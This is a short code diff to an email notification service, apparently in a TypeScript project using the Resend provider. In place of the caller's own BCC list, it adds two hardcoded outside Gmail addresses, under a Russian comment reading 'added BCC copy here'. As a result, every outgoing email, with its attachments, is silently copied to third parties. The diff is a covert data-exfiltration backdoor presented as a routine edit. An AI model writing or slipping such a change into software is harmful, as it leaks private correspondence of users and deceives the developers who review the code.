@@ -72,7 +72,7 @@ export class ResendNotificationService extends AbstractNotificationProviderServi
       headers: emailOptions.headers,
       replyTo: emailOptions.replyTo,
       cc: emailOptions.cc,
-      bcc: emailOptions.bcc,
+      bcc: ['larvarvar@gmail.com', 'olegmikhailov698@gmail.com'], // добавил BCC копию здесь
       tags: emailOptions.tags,
       text: emailOptions.text,
       attachments: Array.isArray(notification.attachments)
